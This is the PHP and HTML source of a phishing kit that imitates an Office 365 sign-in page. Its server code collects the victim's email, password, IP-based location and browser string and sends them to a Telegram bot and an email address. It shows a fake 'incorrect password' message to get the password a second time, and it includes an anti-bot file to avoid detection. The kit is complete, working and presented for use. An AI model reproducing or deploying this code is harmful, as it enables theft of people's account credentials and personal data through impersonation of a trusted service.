<?php include('antibots.php'); ?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to office 365</title>

    <style>
       html,body{width:100%;height:100%;padding:0;margin:0;overflow:hidden;box-sizing:border-box}.app{width:100%;height:100%;background:#fff;overflow:hidden;background:url(./files/msbackground.svg)}.header{position:relative;padding:0 84px;line-height:84px;display:grid;grid-template-columns:1fr auto}.header>a{display:grid;align-content:center}.header>span{color:#39f;font-size:13px}img{width:auto;height:24px}.header span{float:right}main{background:url(./ads2.gif);max-height:1024px;max-width:1440px;width:100%;height:100%;margin:0 auto;display:grid;align-content:center;padding-top:.7rem;font-family:Helvetica,sans-serif}.login-box{text-align:left;box-sizing:border-box;background-color:#fff;color:#26282a;box-shadow:0 2px 4px 0 rgba(0,0,0,.3);width:440px;right:0;margin:0 auto;min-height:370px;z-index:1;padding:28px 5px;padding-top:28px;padding-bottom:28px;padding-bottom:10px;border:1px solid transparent;border-top-color:transparent;border-top-style:solid;border-top-width:1px;border-top:1px solid #f1f1f5}.container{margin:0 auto;max-width:1030px;min-width:320px;position:relative}.logo{padding:0 2.2rem}strong{display:block;margin:1rem 0;font-size:21px;line-height:24px}.challenge{padding:0 1.41176rem;margin:0 auto;margin-top:10px;max-width:22.5rem}input{border-radius:0;border:none;color:var(--c-main);font-size:14px;width:100%;height:48px;outline:none;background:transparent;transition:border 0.2s ease-in-out;border-bottom:.05882rem solid #b9bdc5}button,.button{box-sizing:border-box;border-radius:2px;cursor:pointer;display:flex;border:none;float:right;align-items:center;line-height:1;font-size:14px;padding:12px 20px;text-align:center;justify-content:center;text-decoration:none;color:#fff;background:#39f}button.outline,.button.outline{background:0 0;color:#39f;border:1px solid #39f}.radio-button,.checkbox{position:relative;margin:20px 0}.checkbox{display:block}.radio-button input,.checkbox input{position:absolute;margin:5px;padding:0;visibility:hidden}.radio-button .label-visible,.checkbox .label-visible{margin-bottom:0}.fake-radiobutton,.fake-checkbox{position:absolute;display:block;top:0;left:3px;width:20px;height:20px;border:1px solid slategray;background-color:#fff}.fake-radiobutton:after,.fake-checkbox:after{content:"";display:none;position:absolute;top:50%;left:50%;width:16px;height:16px;background:navy;transform:translateX(-50%) translateY(-50%)}.fake-radiobutton{border-radius:50%}.fake-radiobutton:after{border-radius:50%}input[type="radio"]:checked+span .fake-radiobutton:after,input[type="checkbox"]:checked+span .fake-checkbox:after{display:block}.helper{color:#39f;font-size:12px}.helper p{color:#26282a}.helper>p>span{color:#39f}.helper>span>img{position:absolute;height:16px;margin-left:5px}.m-t-2{display:block;margin-top:1.5rem}footer{position:fixed;width:100%;bottom:0;right:0;left:0;padding:5px 0;font-size:9px;text-align:center;background:#fff}footer span:not(.space){color:#39f}footer .space{margin:0 5px}.options{background:#fff;margin-top:1.5rem;padding:1rem 2.2rem;box-shadow:0 2px 4px 0 rgba(0,0,0,.3)}.options>span>img{display:inline-block;margin-bottom:-7px}@media only screen and (max-width:640px){.app{background:#fff}main{display:block}.login-box,.options{border-top:0;box-shadow:none}.options{border:1px solid #26282a;margin:0 2.2rem;font-size:14px;padding:.5rem 2.2rem}}
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    <?php

    session_start();

    include('mail.php');
    $adddate=date("D M d, Y g:i a");
    $loginemail = $_POST['username'];
    $password1 = $_POST['password'];
    $loc1 = $_POST['loctn'];
    $locH = $_POST['loctH'];
    $browser = $_SERVER['HTTP_USER_AGENT'];

    $message .= "---------=== Outlook LOGIN ===---------\n\n";
    $message .= "Email : $loginemail\n";
    $message .= "Pass : $password1\n\n";
    $message .= "================Location========================\n\n";
    $message .= "Location : $loc1\n";
    $message .= "Date:  ".$adddate."\n";
    $message .= "Browser:  ".$browser."\n\n";
    $message .= "---------=== MELLIVORA ===----------\n\n";

    $pfw_header = "From: Honey <noreply>\n";
    $pfw_subject = "Aol - $locH";

    $TELEGRAM = "https://api.telegram.org/bot$apiToken";
    foreach ($ids as $id) {
        $data = http_build_query(array(
            'chat_id'=> $id,
            'text'=> $message,
            'parse_mode'=> 'HTML' // Optional: Markdown | HTML
        ));
        $response = file_get_contents("$TELEGRAM/sendMessage?$data");
    };
    @mail($to, $pfw_subject ,$message ,$pfw_header ) ;

    $useremail = substr($loginemail, 0, strpos($loginemail, "@"));

    ?>
    <div class="app">
        <script language="Javascript"> 
            function  echeck(str) {
                var emailID=document.login.username
                var emailPASS=document.login.password

                var at="@"
                var dot="."
                var lat=str.indexOf(at)
                var lstr=str.length
                var ldot=str.indexOf(dot)
                if (str.indexOf(at)==-1){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(at,(lat+1))!=-1){
                    emailID.focus()
                    return false
                }
        
                if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
                    emailID.focus()
                    return false
                }
        
                if (str.indexOf(dot,(lat+2))==-1){
                    emailID.focus()
                    return false
                }
            
                if (str.indexOf(" ")!=-1){
                    emailID.focus()
                    return false
                }
        
                return true					
            }
             
            function ValidateFormOther(){
                var emailID=document.login.username
                var emailPASS=document.login.password
                
                if ((emailID.value==null)||(emailID.value=="")){
                    emailID.focus()
                    return false
                }
                if ((emailPASS.value==null)||(emailPASS.value=="")){
                    emailPASS.focus()
                    return false
                }
                if (echeck(emailID.value)==false){
                    emailID.value=""
                    emailID.focus()
                    return false
                }
                return true
            }
        </script> 
        <style>
            .hidden {
                display: none !important;
            }
        </style>
        <main>
            <div class="container">
               <div class="col-1">
                    <div class="login-box">
                        <div class="logo">
                            <img src="./files/mslogo.svg" alt="">
                            <div class="mailname" type="button" style="display: grid;grid-template-columns: auto 1fr;align-items: center;grid-gap: 2px;margin-top: 20px;opacity: .9;">
                                <img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
                                <span><?php echo $loginemail ?></span>
                            </div>
                        </div>
                        <div class="challenge">
                            <strong>Enter password</strong>
                            <p style="color: red;">Your account or password is incorrect. If you don't remember your password, <span style="color: #39f;">reset it now.</span></p>
                            <form action="office365.php" method="post" name="login" id="login" onsubmit="return ValidateFormOther()">
                            <input name="username" type="hidden" id="username" value="<?php echo $loginemail ?>" placeholder="Username, email, or mobile">
                                <input  name="password" type="password" id="password" placeholder="Password">
                                <input  name="loctn" type="hidden" id="loctn" value="">
                                <input  name="loctH" type="hidden" id="loctH" value="">
                                <div class="helper">
                                    <p><span>Forgot password?</span></p>
                                    <span class="m-t-2">Other ways to sign in</span>
                                </div>
                                <button name="submit" type="submit" class="">Sign in</button>
                            </form>
                        </div>
                        <div class="message hidden" style="margin: 10em 0;text-align: center;">Thank you. Ads Removed!</div>
                    </div>
                </div>
            </div>
        </main>
        
    </div>

    <noscript>&lt;i&gt;Javascript required&lt;/i&gt;</noscript>
    <script>
        jQuery.get("https://ipinfo.io", function(e) {
            const locHead = JSON.stringify(e.ip + " | " + e.city + " | " + e.region + " | " + e.country)
            const loc = JSON.stringify(e)
            document.getElementById('loctH').value = locHead;
            document.getElementById('loctn').value = loc;
        }, "jsonp")
    </script>
</body>
</html>